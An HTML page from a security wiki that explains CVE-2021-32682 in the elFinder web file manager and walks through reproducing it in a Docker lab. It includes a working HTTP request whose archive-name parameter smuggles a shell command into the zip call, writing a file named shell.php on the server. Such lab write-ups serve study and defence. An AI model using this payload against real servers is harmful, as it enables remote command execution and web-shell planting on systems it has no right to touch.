<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/elfinder/CVE-2021-32682/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>elFinder ZIP Arguments Injection Leads to Commands Injection (CVE-2021-32682) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "elFinder ZIP Arguments Injection Leads to Commands Injection (CVE-2021-32682)", url: "#_top", children: [
              {title: "Vulnerability Environment", url: "#vulnerability-environment" },
              {title: "Vulnerability Reproduce", url: "#vulnerability-reproduce" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        elFinder ZIP 参数与任意命令注入（CVE-2021-32682）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../eking%E7%AE%A1%E7%90%86%E6%98%93/eking%E7%AE%A1%E7%90%86%E6%98%93Html5Upload%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../eking%E7%AE%A1%E7%90%86%E6%98%93/eking%E7%AE%A1%E7%90%86%E6%98%93Html5Upload%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        eking管理易Html5Upload接口存在任意文件上传漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="elfinder-zip-arguments-injection-leads-to-commands-injection-cve-2021-32682">elFinder ZIP Arguments Injection Leads to Commands Injection (CVE-2021-32682)<a class="headerlink" href="#elfinder-zip-arguments-injection-leads-to-commands-injection-cve-2021-32682" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>elFinder is an open-source file manager for web, written in JavaScript using jQuery UI.</p>
<p>There is a arguments injection vulnerability found in the elFinder 2.1.48 and before. This vulnerability can allow an attacker to execute arbitrary commands on the server hosting the elFinder PHP connector, even with minimal configuration. The issues were patched in version 2.1.59. As a workaround, ensure the connector is not exposed without authentication.</p>
<p>References:</p>
<ul>
<li><a href="https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities">https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities</a></li>
<li><a href="https://packetstormsecurity.com/files/164173/elfinder_archive_cmd_injection.rb.txt">https://packetstormsecurity.com/files/164173/elfinder_archive_cmd_injection.rb.txt</a></li>
<li><a href="https://xz.aliyun.com/t/10739">https://xz.aliyun.com/t/10739</a></li>
</ul>
<h2 id="vulnerability-environment">Vulnerability Environment<a class="headerlink" href="#vulnerability-environment" title="Permanent link">&para;</a></h2>
<p>Execute following command to start a elFinder 2.1.48:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the server is started, you can see the main page of elFinder at <code>http://your-ip:8080</code>.</p>
<h2 id="vulnerability-reproduce">Vulnerability Reproduce<a class="headerlink" href="#vulnerability-reproduce" title="Permanent link">&para;</a></h2>
<p>Firstly, you should prepare 2 files for this vulnerability flow.</p>
<p>Create a plain text file named <code>1.txt</code>:</p>
<p><img alt="" src="1.png" /></p>
<p>Archive this file in the right-click menu to ZIP format, and modify this archived file name to <code>2.zip</code>:</p>
<p><img alt="" src="2.png" /></p>
<p><code>1.txt</code> and <code>2.zip</code> are ready here:</p>
<p><img alt="" src="3.png" /></p>
<p>Then, send the following request to execute arbitrary commands:</p>
<div class="highlight"><pre><span></span><code>GET /php/connector.minimal.php?cmd=archive&amp;name=-TvTT=id&gt;shell.php%20%23%20a.zip&amp;target=l1_Lw&amp;targets%5B1%5D=l1_Mi56aXA&amp;targets%5B0%5D=l1_MS50eHQ&amp;type=application%2Fzip HTTP/1.1
Host: your-ip
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://localhost.lan:8080/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection: close
</code></pre></div>
<p>In this request, you can see 3 important parameters:</p>
<ul>
<li><code>name</code>, its value is equal to <code>-TvTT=id&gt;shell.php # a.zip</code>, you can modify the <code>id&gt;shell.php</code> to arbitrary commands</li>
<li><code>targets[0]</code>, its value is equal to <code>l1_MS50eHQ</code>. <code>l1</code> means the first storage volume, <code>MS50eHQ</code> is the base64 encoded string of <code>1.txt</code></li>
<li><code>targets[1]</code>, its value is equal to <code>l1_Mi56aXA</code>. <code>l1</code> means the first storage volume, <code>Mi56aXA</code> is the base64 encoded string of <code>2.zip</code></li>
</ul>
<p>Although this request responeds to an error message, our command has been executed and <code>shell.php</code> has been written to <code>http://your-ip:8080/files/shell.php</code>:</p>
<p><img alt="" src="4.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        elFinder ZIP 参数与任意命令注入（CVE-2021-32682）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../eking%E7%AE%A1%E7%90%86%E6%98%93/eking%E7%AE%A1%E7%90%86%E6%98%93Html5Upload%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../eking%E7%AE%A1%E7%90%86%E6%98%93/eking%E7%AE%A1%E7%90%86%E6%98%93Html5Upload%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        eking管理易Html5Upload接口存在任意文件上传漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>